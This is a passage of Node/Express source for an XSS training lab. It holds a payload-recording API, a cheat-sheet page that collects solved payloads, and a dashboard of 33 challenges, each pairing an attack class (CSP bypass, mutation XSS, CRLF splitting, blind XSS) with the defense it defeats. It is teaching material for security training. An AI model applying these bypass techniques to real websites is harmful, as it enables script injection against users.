    solutions[level] = { solvedAt: new Date().toISOString(), payloads: [] };
  }
  if (payload && !solutions[level].payloads.includes(payload)) {
    solutions[level].payloads.push(payload);
  }
  saveSolutions();
  res.json({ ok: true, writeup: writeups[level] || null });
});

app.get('/api/solutions', (req, res) => res.json(solutions));

app.post('/api/reset', (req, res) => {
  Object.keys(solutions).forEach(k => delete solutions[k]);
  saveSolutions();
  res.json({ ok: true });
});

// ============================================================
// CHEAT SHEET
// ============================================================
app.get('/cheatsheet', (req, res) => {
  const levelMeta = {
    1: { name: 'Hello, Reflected XSS', diff: 'Easy', context: 'HTML Body', defense: 'None' },
    2: { name: 'Stored XSS Guestbook', diff: 'Easy', context: 'HTML Body (Stored)', defense: 'None' },
    3: { name: 'Script Tag Blocked', diff: 'Medium', context: 'HTML Body', defense: '&lt;script&gt; stripped' },
    4: { name: 'Attribute Injection', diff: 'Medium', context: 'HTML Attribute', defense: 'None' },
    5: { name: 'JavaScript Context', diff: 'Medium', context: 'JS String', defense: '&lt; &gt; encoded' },
    6: { name: 'Event Handler Blocklist', diff: 'Hard', context: 'HTML Body', defense: '12 event handlers blocked' },
    7: { name: 'Case & Keyword Filter', diff: 'Hard', context: 'HTML Body', defense: 'Single-pass keyword strip' },
    8: { name: 'DOM-Based XSS', diff: 'Hard', context: 'DOM (location.hash → innerHTML)', defense: 'No server-side reflection' },
    9: { name: 'href Injection', diff: 'Expert', context: 'href Attribute', defense: 'javascript: blocked' },
    10: { name: 'CSP Bypass', diff: 'Expert', context: 'HTML Body + CSP', defense: "script-src 'nonce' 'self'" },
    11: { name: 'Double Encoding', diff: 'Expert', context: 'HTML Body', defense: 'WAF decode + tag/handler/javascript: filter' },
    12: { name: 'Template Injection', diff: 'Expert', context: 'Client-side template', defense: 'All HTML tags stripped' },
    13: { name: 'postMessage XSS', diff: 'Expert', context: 'DOM (postMessage → innerHTML)', defense: 'No reflection, no form' },
    14: { name: 'SVG Upload XSS', diff: 'Expert', context: 'Inline SVG', defense: '&lt;script&gt; stripped' },
    15: { name: 'Mutation XSS', diff: 'Expert', context: 'DOMParser sanitizer + template', defense: 'Scripts + handlers stripped (querySelectorAll)' },
    16: { name: 'Recursive Filter', diff: 'Expert', context: 'HTML Body', defense: 'Recursive keyword loop' },
    17: { name: 'The Polyglot', diff: 'Expert', context: 'HTML + Attribute + JS', defense: '&lt;script&gt; stripped, " encoded' },
    18: { name: 'DOM Clobbering', diff: 'Expert', context: 'HTML Body → window globals', defense: '&lt;script&gt;/handlers/javascript: stripped' },
    19: { name: 'Prototype Pollution → XSS', diff: 'Expert', context: 'JSON merge → innerHTML', defense: 'No direct HTML injection' },
    20: { name: 'Base Tag Injection', diff: 'Expert', context: 'HTML Body (before scripts)', defense: 'CSP nonce + self, &lt;script&gt;/handlers stripped' },
    21: { name: 'Dangling Markup', diff: 'Expert', context: 'HTML Attribute', defense: 'All execution vectors blocked' },
    22: { name: 'JSON Injection', diff: 'Expert', context: 'JSON in &lt;script&gt; block', defense: 'CSP nonce, &lt; &gt; Unicode-escaped' },
    23: { name: 'URL Scheme Bypass', diff: 'Expert', context: 'a href attribute', defense: '&lt;script&gt;/handlers stripped, javascript: blocked' },
    24: { name: 'CSS Injection Exfiltration', diff: 'Expert', context: '&lt;style&gt; block', defense: 'All JS vectors blocked, CSP partial' },
    25: { name: 'Open Redirect → XSS', diff: 'Hard', context: 'meta-refresh redirect', defense: 'No direct HTML injection' },
    26: { name: 'CRLF → Response Splitting', diff: 'Expert', context: 'HTTP Response Header', defense: 'Header reflected without CRLF strip' },
    27: { name: 'localStorage DOM XSS', diff: 'Hard', context: 'DOM (localStorage → innerHTML)', defense: 'No server reflection' },
    28: { name: 'Markdown Injection', diff: 'Medium', context: 'Markdown renderer output', defense: 'Naive regex renderer' },
    29: { name: 'iframe Sandbox Escape', diff: 'Expert', context: 'Sandboxed iframe → parent', defense: 'allow-scripts allow-same-origin' },
    30: { name: 'AngularJS Sandbox Escape', diff: 'Expert', context: 'AngularJS 1.x expression', defense: 'Angular expression sandbox' },
    31: { name: 'Web Component Slot Injection', diff: 'Expert', context: 'Shadow DOM innerHTML', defense: '&lt;script&gt; stripped, slot-name filtered' },
    32: { name: 'Filename Injection', diff: 'Medium', context: 'Upload filename in HTML', defense: 'None on filename' },
    33: { name: 'Blind XSS (Out-of-Band)', diff: 'Expert', context: 'Admin panel (deferred render)', defense: 'Input never reflected to submitter' }
  };

  const TOTAL = 33;
  let rows = '';
  for (let i = 1; i <= TOTAL; i++) {
    const meta = levelMeta[i];
    const sol = solutions[i];
    const diffColor = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Expert: '#bc4dff' }[meta.diff];
    if (sol) {
      const payloads = sol.payloads.map(p => {
        const escaped = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        return '<code style="display:block;margin:0.25rem 0;padding:0.4rem 0.6rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;word-break:break-all;font-size:0.8rem;">' + escaped + '</code>';
      }).join('');
      rows += '<tr><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#3fb950;">Solved</td><td>' + (payloads || '<span style="color:#484f58;">Not recorded</span>') + '</td></tr>';
    } else {
      rows += '<tr style="opacity:0.4;"><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#484f58;">Unsolved</td><td><span style="color:#484f58;">&mdash;</span></td></tr>';
    }
  }

  const solvedCount = Object.keys(solutions).length;
  const totalPayloads = Object.values(solutions).reduce((a, s) => a + s.payloads.length, 0);
  const metaJSON = JSON.stringify(levelMeta);

  // Build redesigned rows
  const diffColors = { Easy: '#00ff9d', Medium: '#ffd60a', Hard: '#ff6b35', Expert: '#e040fb' };
  let newRows = '';
  for (let i = 1; i <= TOTAL; i++) {
    const meta = levelMeta[i];
    const sol = solutions[i];
    const dc = diffColors[meta.diff] || '#e040fb';
    const diffBg = { Easy: 'rgba(0,255,157,0.07)', Medium: 'rgba(255,214,10,0.07)', Hard: 'rgba(255,107,53,0.07)', Expert: 'rgba(224,64,251,0.07)' }[meta.diff];
    const diffBorder = { Easy: 'rgba(0,255,157,0.3)', Medium: 'rgba(255,214,10,0.3)', Hard: 'rgba(255,107,53,0.3)', Expert: 'rgba(224,64,251,0.3)' }[meta.diff];
    const statusCell = sol
      ? '<span style="color:#00ff9d;font-size:0.68rem;font-weight:700;background:rgba(0,255,157,0.07);border:1px solid rgba(0,255,157,0.3);padding:0.15rem 0.55rem;border-radius:3px;">SOLVED</span>'
      : '<span style="color:#5a5a7a;font-size:0.68rem;">unsolved</span>';
    const payloadCell = sol && sol.payloads.length
      ? sol.payloads.map(p => {
        const esc = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        return `<code style="display:block;margin:0.2rem 0;padding:0.3rem 0.5rem;background:#07070f;border:1px solid #1e1e30;border-radius:3px;word-break:break-all;font-size:0.72rem;color:#d4d4e8;">${esc}</code>`;
      }).join('')
      : '<span style="color:#3a3a55;font-size:0.75rem;">&mdash;</span>';
    const opacity = sol ? '1' : '0.38';
    newRows += `<tr style="opacity:${opacity};border-top:1px solid #1e1e30;">
      <td style="padding:0.75rem 1rem;white-space:nowrap;">
        <span style="font-size:0.65rem;font-weight:700;color:${dc};background:${diffBg};border:1px solid ${diffBorder};padding:0.15rem 0.55rem;border-radius:3px;text-transform:uppercase;letter-spacing:0.1em;">${meta.diff}</span>
        <span style="display:block;font-size:0.72rem;color:#5a5a7a;margin-top:0.25rem;letter-spacing:0.05em;">LVL-${String(i).padStart(2, '0')}</span>
      </td>
      <td style="padding:0.75rem 1rem;"><a href="/level/${i}" style="color:#d4d4e8;text-decoration:none;font-size:0.82rem;font-weight:600;">${meta.name}</a></td>
      <td style="padding:0.75rem 1rem;font-size:0.78rem;color:#8080a0;">${meta.context}</td>
      <td style="padding:0.75rem 1rem;font-size:0.78rem;color:#8080a0;">${meta.defense}</td>
      <td style="padding:0.75rem 1rem;">${statusCell}</td>
      <td style="padding:0.75rem 1rem;">${payloadCell}</td>
    </tr>`;
  }

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cheat Sheet — XSS Lab</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#07070f; --surface:#0e0e1a; --surface2:#13131f;
      --border:#1e1e30; --border2:#2a2a3e;
      --text:#d4d4e8; --muted:#5a5a7a; --accent:#00ff9d;
      --mono:'JetBrains Mono',monospace; --sans:'Syne',sans-serif;
    }
    *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:var(--mono);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
    body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
      background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);}
    .topbar{position:sticky;top:0;z-index:100;background:rgba(7,7,15,0.94);backdrop-filter:blur(12px);
      border-bottom:1px solid var(--border);padding:0.75rem 2rem;
      display:flex;align-items:center;justify-content:space-between;gap:1rem;}
    .topbar-logo{font-family:var(--sans);font-weight:800;font-size:1rem;color:var(--accent);
      text-shadow:0 0 14px var(--accent);text-decoration:none;}
    .topbar-right{display:flex;align-items:center;gap:0.75rem;}
    .topbar-link{color:var(--muted);text-decoration:none;font-size:0.7rem;text-transform:uppercase;
      letter-spacing:0.08em;padding:0.35rem 0.8rem;border:1px solid var(--border2);border-radius:5px;
      transition:color 0.2s,border-color 0.2s;}
    .topbar-link:hover{color:var(--text);border-color:var(--border);}
    .page-wrap{max-width:1300px;margin:0 auto;padding:2.5rem 2rem 4rem;position:relative;z-index:1;}
    .page-eyebrow{font-size:0.65rem;text-transform:uppercase;letter-spacing:0.2em;color:var(--muted);margin-bottom:0.6rem;}
    .page-title{font-family:var(--sans);font-size:2rem;font-weight:800;color:#eeeeff;
      letter-spacing:-0.01em;margin-bottom:0.5rem;}
    .page-sub{font-size:0.8rem;color:var(--muted);margin-bottom:2rem;line-height:1.6;}
    .stats-row{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:2rem;}
    .stat-chip{background:var(--surface);border:1px solid var(--border2);border-radius:8px;
      padding:0.75rem 1.25rem;display:flex;flex-direction:column;gap:0.2rem;min-width:120px;}
    .stat-num{font-family:var(--sans);font-size:1.5rem;font-weight:800;}
    .stat-num.green{color:var(--accent);text-shadow:0 0 10px rgba(0,255,157,0.25);}
    .stat-num.neutral{color:#eeeeff;}
    .stat-label{font-size:0.63rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);}
    .table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;overflow-x:auto;margin-bottom:1.5rem;}
    table{width:100%;border-collapse:collapse;}
    thead tr{background:var(--surface2);}
    th{padding:0.65rem 1rem;text-align:left;font-size:0.63rem;font-weight:700;text-transform:uppercase;
      letter-spacing:0.12em;color:var(--muted);white-space:nowrap;border-bottom:1px solid var(--border);}
    td{vertical-align:top;}
    tr:hover td{background:rgba(255,255,255,0.015);}
    .export-btn{padding:0.55rem 1.25rem;background:rgba(0,255,157,0.07);border:1px solid rgba(0,255,157,0.3);
      border-radius:6px;color:var(--accent);font-size:0.72rem;font-weight:700;text-transform:uppercase;
      letter-spacing:0.08em;cursor:pointer;font-family:var(--mono);transition:background 0.2s;}
    .export-btn:hover{background:rgba(0,255,157,0.12);}
    ::-webkit-scrollbar{width:5px;height:5px;}
    ::-webkit-scrollbar-track{background:var(--bg);}
    ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
  </style>
</head>
<body>
  <nav class="topbar">
    <a href="/" class="topbar-logo">XSS Lab</a>
    <div class="topbar-right">
      <a href="/" class="topbar-link">← Dashboard</a>
    </div>
  </nav>

  <div class="page-wrap">
    <div class="page-eyebrow">The Cyber Ledger</div>
    <h1 class="page-title">Payload Cheat Sheet</h1>
    <p class="page-sub">Your collected payloads &amp; progress across all 33 levels.</p>

    <div class="stats-row">
      <div class="stat-chip">
        <div class="stat-num green">${solvedCount}</div>
        <div class="stat-label">Levels Solved</div>
      </div>
      <div class="stat-chip">
        <div class="stat-num neutral">${TOTAL - solvedCount}</div>
        <div class="stat-label">Remaining</div>
      </div>
      <div class="stat-chip">
        <div class="stat-num neutral">${totalPayloads}</div>
        <div class="stat-label">Payloads Collected</div>
      </div>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Diff / Level</th>
            <th>Challenge</th>
            <th>Context</th>
            <th>Defense</th>
            <th>Status</th>
            <th>Your Payloads</th>
          </tr>
        </thead>
        <tbody>${newRows}</tbody>
      </table>
    </div>

    <button class="export-btn" onclick="exportCheatSheet()">Export as Markdown</button>
  </div>

  <script>
    function exportCheatSheet(){
      fetch('/api/solutions').then(function(r){return r.json();}).then(function(sols){
        var md='# XSS Payload Cheat Sheet\n\nGenerated from The Cyber Ledger XSS Training Lab\n\n';
        var meta=${metaJSON};
        for(var i=1;i<=${TOTAL};i++){
          var m=meta[i];
          md+='## Level '+i+': '+m.name+'\n';
          md+='- **Difficulty:** '+m.diff+'\n';
          md+='- **Context:** '+m.context+'\n';
          md+='- **Defense:** '+m.defense+'\n';
          if(sols[i]){
            md+='- **Status:** Solved\n';
            md+='- **Payloads:**\n';
            sols[i].payloads.forEach(function(p){md+='  - \x60'+p+'\x60\n';});
          } else {
            md+='- **Status:** Unsolved\n';
          }
          md+='\n';
        }
        var blob=new Blob([md],{type:'text/markdown'});
        var a=document.createElement('a');
        a.href=URL.createObjectURL(blob);
        a.download='xss-cheatsheet.md';
        a.click();
      });
    }
  </script>
</body>
</html>`);
});

// ============================================================
// DASHBOARD  (redesigned UI)
// ============================================================
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Lab — The Cyber Ledger</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:#07070f; --surface:#0e0e1a; --surface2:#13131f;
      --border:#1e1e30; --border2:#2a2a3e;
      --text:#d4d4e8; --muted:#5a5a7a;
      --easy:#00ff9d; --medium:#ffd60a; --hard:#ff6b35; --expert:#e040fb;
      --mono:'JetBrains Mono',monospace; --sans:'Syne',sans-serif;
    }
    *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:var(--mono);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
    body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
      background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);}

    /* ── Topbar ── */
    .topbar{position:sticky;top:0;z-index:100;background:rgba(7,7,15,0.94);backdrop-filter:blur(12px);
      border-bottom:1px solid var(--border);padding:0.75rem 2rem;
      display:flex;align-items:center;justify-content:space-between;gap:1rem;}
    .topbar-logo{font-family:var(--sans);font-weight:800;font-size:1rem;color:var(--easy);
      text-shadow:0 0 14px var(--easy);letter-spacing:0.02em;text-decoration:none;}
    .topbar-right{display:flex;align-items:center;gap:0.75rem;}
    .topbar-link{color:var(--muted);text-decoration:none;font-size:0.7rem;text-transform:uppercase;
      letter-spacing:0.08em;padding:0.35rem 0.8rem;border:1px solid var(--border2);border-radius:5px;
      transition:color 0.2s,border-color 0.2s;}
    .topbar-link:hover{color:var(--text);border-color:var(--border);}
    .reset-btn{color:#ff5555;background:rgba(255,85,85,0.06);border:1px solid rgba(255,85,85,0.25);
      font-size:0.7rem;text-transform:uppercase;letter-spacing:0.08em;padding:0.35rem 0.8rem;
      border-radius:5px;cursor:pointer;font-family:var(--mono);transition:background 0.2s;}
    .reset-btn:hover{background:rgba(255,85,85,0.12);}

    /* ── Hero ── */
    .hero{position:relative;z-index:1;padding:3.5rem 2rem 2.5rem;max-width:1400px;margin:0 auto;}
    .hero-eyebrow{font-size:0.65rem;text-transform:uppercase;letter-spacing:0.2em;color:var(--muted);margin-bottom:0.75rem;}
    .hero-title{font-family:var(--sans);font-size:clamp(2rem,5vw,3.5rem);font-weight:800;
      color:#eeeeff;line-height:1.05;letter-spacing:-0.02em;margin-bottom:1rem;}
    .hero-title span{color:var(--easy);text-shadow:0 0 20px rgba(0,255,157,0.4);}
    .hero-sub{font-size:0.85rem;color:var(--muted);max-width:480px;line-height:1.65;margin-bottom:2rem;}

    /* ── Stats row ── */
    .stats-row{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:0.5rem;}
    .stat-chip{background:var(--surface);border:1px solid var(--border2);border-radius:8px;
      padding:0.75rem 1.25rem;display:flex;flex-direction:column;gap:0.2rem;min-width:130px;}
    .stat-num{font-family:var(--sans);font-size:1.6rem;font-weight:800;color:#eeeeff;}
    .stat-num.green{color:var(--easy);text-shadow:0 0 12px rgba(0,255,157,0.3);}
    .stat-label{font-size:0.65rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);}

    /* ── Progress bar ── */
    .progress-wrap{margin-top:1.25rem;max-width:500px;}
    .progress-meta{display:flex;justify-content:space-between;font-size:0.7rem;color:var(--muted);margin-bottom:0.4rem;}
    .progress-meta span{color:var(--text);}
    .progress-track{height:4px;background:var(--surface2);border-radius:2px;overflow:hidden;}
    .progress-fill{height:100%;background:linear-gradient(90deg,var(--easy),#00c87a);border-radius:2px;
      width:0%;transition:width 0.6s cubic-bezier(0.4,0,0.2,1);}

    /* ── How it works ── */
    .howto{max-width:1400px;margin:0 auto;padding:0 2rem 2rem;position:relative;z-index:1;}
    .howto-toggle{display:flex;align-items:center;gap:0.5rem;background:none;border:1px solid var(--border);
      border-radius:7px;padding:0.6rem 1rem;color:var(--muted);font-size:0.72rem;text-transform:uppercase;
      letter-spacing:0.08em;cursor:pointer;font-family:var(--mono);transition:color 0.2s,border-color 0.2s;}
    .howto-toggle:hover{color:var(--text);border-color:var(--border2);}
    .howto-toggle .arrow{transition:transform 0.25s;}
    .howto-toggle.open .arrow{transform:rotate(180deg);}
    .howto-body{display:none;margin-top:0.75rem;background:var(--surface);border:1px solid var(--border);
      border-radius:8px;padding:1.25rem 1.5rem;}
    .howto-body.visible{display:block;}
    .howto-body ul{padding-left:1.25rem;display:flex;flex-direction:column;gap:0.5rem;}
    .howto-body li{font-size:0.8rem;color:var(--muted);line-height:1.6;}
    .howto-body li strong{color:var(--text);}
    .howto-body code{background:#0d0d1a;color:var(--easy);padding:0.1rem 0.35rem;border-radius:3px;font-size:0.78rem;}

    /* ── Section labels ── */
    .section-row{display:flex;align-items:center;gap:1rem;grid-column:1/-1;margin-top:1rem;padding-top:1rem;border-top:1px solid var(--border);}
    .section-label{font-size:0.65rem;font-weight:700;text-transform:uppercase;letter-spacing:0.18em;white-space:nowrap;}
    .section-label.easy{color:var(--easy);}
    .section-label.medium{color:var(--medium);}
    .section-label.hard{color:var(--hard);}
    .section-label.expert{color:var(--expert);}
    .section-line{flex:1;height:1px;background:var(--border);}

    /* ── Level grid ── */
    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1rem;
      padding:0 2rem 3rem;max-width:1400px;margin:0 auto;position:relative;z-index:1;}

    /* ── Cards ── */
    .card{background:var(--surface);border:1px solid var(--border);border-radius:10px;
      padding:1.25rem;position:relative;display:flex;flex-direction:column;gap:0.6rem;
      transition:border-color 0.2s,transform 0.2s,box-shadow 0.2s;}
    .card:hover{transform:translateY(-2px);}
    .card.diff-easy:hover{border-color:rgba(0,255,157,0.4);box-shadow:0 4px 24px rgba(0,255,157,0.07);}
    .card.diff-medium:hover{border-color:rgba(255,214,10,0.4);box-shadow:0 4px 24px rgba(255,214,10,0.07);}
    .card.diff-hard:hover{border-color:rgba(255,107,53,0.4);box-shadow:0 4px 24px rgba(255,107,53,0.07);}
    .card.diff-expert:hover{border-color:rgba(224,64,251,0.4);box-shadow:0 4px 24px rgba(224,64,251,0.07);}
    .card.solved{border-color:rgba(0,255,157,0.3);box-shadow:0 0 0 1px rgba(0,255,157,0.08);}

    .card-top{display:flex;align-items:center;justify-content:space-between;}
    .card-lvl{font-size:0.63rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;}
    .card.diff-easy .card-lvl{color:var(--easy);}
    .card.diff-medium .card-lvl{color:var(--medium);}
    .card.diff-hard .card-lvl{color:var(--hard);}
    .card.diff-expert .card-lvl{color:var(--expert);}

    .solved-check{width:18px;height:18px;background:var(--easy);border-radius:50%;display:none;
      align-items:center;justify-content:center;font-size:10px;color:#000;font-weight:700;flex-shrink:0;}
    .card.solved .solved-check{display:flex;}

    .card h2{font-family:var(--sans);font-size:1rem;font-weight:700;color:#eeeeff;line-height:1.2;}
    .card p{font-size:0.78rem;color:var(--muted);line-height:1.55;flex:1;}
    .tags{display:flex;gap:0.4rem;flex-wrap:wrap;}
    .tag{font-size:0.63rem;padding:0.15rem 0.5rem;border-radius:3px;border:1px solid var(--border2);color:var(--muted);}
    .card-link{display:inline-block;margin-top:0.25rem;padding:0.45rem 1rem;
      border:1px solid var(--border2);border-radius:6px;color:var(--muted);text-decoration:none;
      font-size:0.72rem;font-weight:700;text-transform:uppercase;letter-spacing:0.07em;
      transition:color 0.2s,border-color 0.2s,background 0.2s;align-self:flex-start;}
    .card.diff-easy .card-link:hover{color:var(--easy);border-color:rgba(0,255,157,0.4);}
    .card.diff-medium .card-link:hover{color:var(--medium);border-color:rgba(255,214,10,0.4);}
    .card.diff-hard .card-link:hover{color:var(--hard);border-color:rgba(255,107,53,0.4);}
    .card.diff-expert .card-link:hover{color:var(--expert);border-color:rgba(224,64,251,0.4);}
    .card.solved .card-link{color:var(--easy);border-color:rgba(0,255,157,0.3);background:rgba(0,255,157,0.05);}

    /* scrollbar */
    ::-webkit-scrollbar{width:5px;height:5px;}
    ::-webkit-scrollbar-track{background:var(--bg);}
    ::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
  </style>
</head>
<body>

  <nav class="topbar">
    <a href="/" class="topbar-logo"> TCL XSS Lab</a>
    <div class="topbar-right">
      <a href="/cheatsheet" class="topbar-link">Cheat Sheet</a>
      <button class="reset-btn" onclick="if(confirm('Reset all progress?')){fetch('/api/reset',{method:'POST'}).then(()=>location.reload())}">Reset Progress</button>
    </div>
  </nav>

  <div class="hero">
    <div class="hero-eyebrow">The Cyber Ledger &mdash; Training Lab</div>
    <h1 class="hero-title">Master <span>XSS</span><br>One Exploit at a Time</h1>
    <p class="hero-sub">33 progressive challenges from raw reflection to blind out-of-band execution. Each level teaches a real attack class with a writeup when you solve it.</p>

    <div class="stats-row">
      <div class="stat-chip">
        <div class="stat-num green" id="solved-count">0</div>
        <div class="stat-label">Solved</div>
      </div>
      <div class="stat-chip">
        <div class="stat-num" id="remaining-count">33</div>
        <div class="stat-label">Remaining</div>
      </div>
      <div class="stat-chip">
        <div class="stat-num">33</div>
        <div class="stat-label">Total Levels</div>
      </div>
    </div>
    <div class="progress-wrap">
      <div class="progress-meta"><span>Progress</span><span id="progress-label">0 / 33</span></div>
      <div class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
    </div>
  </div>

  <div class="howto">
    <button class="howto-toggle" id="howtoBtn" onclick="toggleHowto()">
      <span>How This Lab Works</span><span class="arrow">▾</span>
    </button>
    <div class="howto-body" id="howtoBody">
      <ul>
        <li>Each level has a specific <strong>injection context</strong> and set of <strong>defenses</strong> to bypass.</li>
        <li>Your goal is always to execute <code>alert('XSS')</code> (or trigger the success condition) in your browser.</li>
        <li>When you succeed, a banner appears with a full writeup explaining why it worked.</li>
        <li>Levels get progressively harder — more filters, encoding tricks, CSP, and novel attack surfaces.</li>
        <li>Open the <strong>Hint</strong> on each level if you're stuck. Use DevTools (F12) to inspect your input in context.</li>
        <li>Levels 24–33 introduce new attack classes: CSS exfiltration, CRLF injection, localStorage XSS, blind out-of-band, and more.</li>
      </ul>
    </div>
  </div>

  <div class="grid">
    <div class="section-row"><span class="section-label easy">Easy</span><span class="section-line"></span></div>

    <div class="card diff-easy" data-level="1">
      <div class="card-top"><span class="card-lvl">LVL-01 &mdash; Easy</span><span class="solved-check">✓</span></div>
      <h2>Hello, Reflected XSS</h2>
      <p>No filters, no encoding. Your input is reflected directly into the page.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">No Filter</span></div>
      <a href="/level/1" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-easy" data-level="2">
      <div class="card-top"><span class="card-lvl">LVL-02 &mdash; Easy</span><span class="solved-check">✓</span></div>
      <h2>Stored XSS Guestbook</h2>
      <p>Your input is stored and rendered for all visitors. Classic persistent XSS.</p>
      <div class="tags"><span class="tag">Stored</span><span class="tag">No Filter</span></div>
      <a href="/level/2" class="card-link">Start Challenge</a>
    </div>

    <div class="section-row"><span class="section-label medium">Medium</span><span class="section-line"></span></div>

    <div class="card diff-medium" data-level="3">
      <div class="card-top"><span class="card-lvl">LVL-03 &mdash; Medium</span><span class="solved-check">✓</span></div>
      <h2>Script Tag Blocked</h2>
      <p>The server strips &lt;script&gt; tags. Find another way to execute JavaScript.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Tag Filter</span></div>
      <a href="/level/3" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-medium" data-level="4">
      <div class="card-top"><span class="card-lvl">LVL-04 &mdash; Medium</span><span class="solved-check">✓</span></div>
      <h2>Attribute Injection</h2>
      <p>Your input lands inside an HTML attribute. Break out and execute code.</p>
      <div class="tags"><span class="tag">Attribute Context</span><span class="tag">Quote Escape</span></div>
      <a href="/level/4" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-medium" data-level="5">
      <div class="card-top"><span class="card-lvl">LVL-05 &mdash; Medium</span><span class="solved-check">✓</span></div>
      <h2>JavaScript Context</h2>
      <p>Your input is placed inside a JavaScript string variable. Escape and inject.</p>
      <div class="tags"><span class="tag">JS Context</span><span class="tag">String Escape</span></div>
      <a href="/level/5" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-medium" data-level="28">
      <div class="card-top"><span class="card-lvl">LVL-28 &mdash; Medium</span><span class="solved-check">✓</span></div>
      <h2>Markdown Injection</h2>
      <p>A naive Markdown renderer converts your post to HTML. Make it execute JavaScript.</p>
      <div class="tags"><span class="tag">Markdown</span><span class="tag">Stored</span><span class="tag">Renderer Bypass</span></div>
      <a href="/level/28" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-medium" data-level="32">
      <div class="card-top"><span class="card-lvl">LVL-32 &mdash; Medium</span><span class="solved-check">✓</span></div>
      <h2>Filename Injection</h2>
      <p>Upload a file. The filename is reflected in the UI without sanitization.</p>
      <div class="tags"><span class="tag">File Upload</span><span class="tag">Filename XSS</span><span class="tag">Stored</span></div>
      <a href="/level/32" class="card-link">Start Challenge</a>
    </div>

    <div class="section-row"><span class="section-label hard">Hard</span><span class="section-line"></span></div>

    <div class="card diff-hard" data-level="6">
      <div class="card-top"><span class="card-lvl">LVL-06 &mdash; Hard</span><span class="solved-check">✓</span></div>
      <h2>Event Handler Blocklist</h2>
      <p>Common event handlers are blocked. Find an obscure one the filter missed.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Event Blocklist</span></div>
      <a href="/level/6" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-hard" data-level="7">
      <div class="card-top"><span class="card-lvl">LVL-07 &mdash; Hard</span><span class="solved-check">✓</span></div>
      <h2>Case &amp; Keyword Filter</h2>
      <p>Aggressive single-pass filter. Use nested keywords to reconstruct them after stripping.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Keyword Strip</span><span class="tag">Encoding</span></div>
      <a href="/level/7" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-hard" data-level="8">
      <div class="card-top"><span class="card-lvl">LVL-08 &mdash; Hard</span><span class="solved-check">✓</span></div>
      <h2>DOM-Based XSS</h2>
      <p>No server reflection. The vulnerability is entirely in client-side JavaScript reading from the URL.</p>
      <div class="tags"><span class="tag">DOM-based</span><span class="tag">Client-Side</span></div>
      <a href="/level/8" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-hard" data-level="25">
      <div class="card-top"><span class="card-lvl">LVL-25 &mdash; Hard</span><span class="solved-check">✓</span></div>
      <h2>Open Redirect → XSS</h2>
      <p>An open redirect echoes your destination into a meta-refresh tag. Chain it to XSS.</p>
      <div class="tags"><span class="tag">Open Redirect</span><span class="tag">meta-refresh</span><span class="tag">Chain</span></div>
      <a href="/level/25" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-hard" data-level="27">
      <div class="card-top"><span class="card-lvl">LVL-27 &mdash; Hard</span><span class="solved-check">✓</span></div>
      <h2>localStorage DOM XSS</h2>
      <p>Data is saved to localStorage and rendered on reload. No server ever sees your payload.</p>
      <div class="tags"><span class="tag">DOM-based</span><span class="tag">localStorage</span><span class="tag">Persistent</span></div>
      <a href="/level/27" class="card-link">Start Challenge</a>
    </div>

    <div class="section-row"><span class="section-label expert">Expert</span><span class="section-line"></span></div>

    <div class="card diff-expert" data-level="9">
